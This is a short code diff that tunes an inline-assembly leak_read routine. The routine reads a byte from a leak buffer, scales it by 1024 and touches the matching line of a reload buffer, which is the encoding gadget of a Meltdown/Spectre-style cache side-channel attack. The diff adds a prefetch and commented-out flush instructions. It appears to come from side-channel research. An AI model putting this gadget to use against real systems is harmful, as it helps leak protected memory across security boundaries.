@@ -26,9 +26,12 @@ static inline __attribute__((always_inline)) void maccess(void *ptr) {
 
 static inline __attribute__((always_inline)) void leak_read(void* leak_buffer, void* reload_buffer) {
   asm volatile(
+    // "clflush (%0)\n"
+    // "sfence\n"
     "movq (%0), %%rax\n"
     "andq $0xff, %%rax\n"
     "shlq $0xa, %%rax\n"
+    "prefetcht0 (%1, %%rax)\n"
     "movq (%1, %%rax), %%rax\n"
     :: "r" (leak_buffer), "r" (reload_buffer) : "rax"
   );
